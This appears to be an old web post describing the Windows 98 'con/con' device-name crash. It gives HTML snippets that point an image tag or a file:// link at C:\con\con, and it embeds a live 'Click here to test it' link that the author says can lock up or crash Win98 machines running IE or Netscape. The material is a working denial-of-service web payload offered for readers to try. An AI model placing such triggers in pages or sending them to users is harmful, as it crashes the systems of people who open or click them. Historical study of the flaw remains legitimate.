<tt><u>The Windows 98 "Con" exploit</u></tt><tt></tt>
<p><tt>Although reading various advisories and documents concerning the
/con/con</tt>
<br><tt>exploit, no one has posted it has a hyperlink yet. Some authors
did post it like this :</tt><tt></tt>
<p><tt>&lt;HTML></tt>
<br><tt>&lt;BODY></tt>
<br><tt>&lt;IMG SRC=3D"c:\con\con"></tt>
<br><tt>&lt;/BODY></tt>
<br><tt>&lt;/HTML></tt><tt></tt>
<p><tt>But an author has mentioned that Netscape was not affected (with
the example mentioned above), that's very true "if" applied using the method
mentioned above. But i've tested on my own IE 5.0 and it didn't seem to
affect either. So i've tried putting it like this in an html file:</tt><tt></tt>
<p><tt>&lt;HTML></tt>
<br><tt>&lt;BODY></tt>
<br><tt>&lt;A HREF="file:///C|/con/con"></tt>
<br><tt>&lt;/BODY></tt>
<br><tt>&lt;/HTML></tt><tt></tt>
<p><tt><A HREF="file:///C|/con/con">Click here to test it.</a></tt>
<br><tt>NOTE: THIS MIGHT CAUSE YOUR COMPUTER TO LOCK UP/CRASH, TRY AT OWN
RISK.</tt><tt></tt>
<p><tt>And that have seemed to affect IE AND Netscape browsers running
on Win98 OS.</tt>
<br><tt>Haven't tested with other browsers yet, so any feedback would be
appreciated.</tt><tt></tt>
